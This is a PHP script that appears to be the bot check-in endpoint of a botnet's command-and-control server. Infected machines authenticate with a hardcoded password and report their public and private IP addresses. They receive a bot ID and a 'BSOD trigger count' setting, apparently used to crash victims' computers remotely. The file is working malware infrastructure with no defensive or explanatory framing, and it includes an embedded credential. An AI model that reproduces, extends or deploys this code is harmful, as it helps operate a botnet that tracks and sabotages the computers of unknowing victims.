<?php
	if(isset($_REQUEST["password"]))
		if($_REQUEST["password"]=="ScanonFarchad!1259398521!~")
		{
			require 'db_conn.php';
			header('Content-type: text/xml');
			
			###################################################################################################
			
			if(isset($_REQUEST["BotNetworksPublicIP"]))
				$BotNetworksPublicIP = $_REQUEST["BotNetworksPublicIP"];
			else
				$BotNetworksPublicIP = NULL;
			
			if(isset($_REQUEST["BotsPvtIP"]))
				$BotsPvtIP = $_REQUEST["BotsPvtIP"];
			else
				$BotsPvtIP = NULL;
		
			$preparedStatement = $dbConn->prepare("insert into bot_status_reports values(?, CURRENT_TIMESTAMP, NULL, ?, ?, ?)");
		
			echo "<?xml version=\"1.0\" encoding=\"utf-8\"?>";
			echo "<ConfigParams>";
			
			###################################################################################################
			
			$current_BSOD_Trigger_Count = 0;
			$rs = $dbConn->query("select current_BSOD_Trigger_Count from config_params");
			if($rs)
			{
				while ($row=$rs->fetch_assoc())
					echo "<current_BSOD_Trigger_Count>".($current_BSOD_Trigger_Count = $row["current_BSOD_Trigger_Count"])."</current_BSOD_Trigger_Count>";
			}else
				throw new Exception("Server error occured");
		
			###################################################################################################
		
			$rs = $dbConn->query("select max(BotID) as maxID from bot_status_reports where BotID>=16");			//1st 15 BotIDs are reserved for testing purpose
			if($rs)
			{
				while ($row=$rs->fetch_assoc())
					$maxID = $row["maxID"];
				$rs->close();
				if($maxID==NULL)			//no practical bots present, then insert ID as 16
				{
					$preparedStatement->bind_param("dssd", $num = 16, $BotNetworksPublicIP, $BotsPvtIP, $current_BSOD_Trigger_Count);			//double, string, string, double param binding to prepared stmt
					$preparedStatement->execute();
					if($preparedStatement->affected_rows>0)
					{
						echo '<insertionSuccess>true</insertionSuccess>';
						echo "<YourID>".$num."</YourID>";
					}else
						echo '<insertionSuccess>false</insertionSuccess>';
				}else
				{
					$requestedID = ((integer)$maxID)+1;
					$preparedStatement->bind_param("dssd", $requestedID, $BotNetworksPublicIP, $BotsPvtIP, $current_BSOD_Trigger_Count);			//double, string, string, double param binding to prepared stmt
					$preparedStatement->execute();
					if($preparedStatement->affected_rows>0)
					{
						echo '<insertionSuccess>true</insertionSuccess>';
						echo "<YourID>".$requestedID."</YourID>";
					}else
						echo '<insertionSuccess>false</insertionSuccess>';
				}
			}else
				throw new Exception("Server error occured");
			
			###################################################################################################
		
			echo "</ConfigParams>";
		}
?>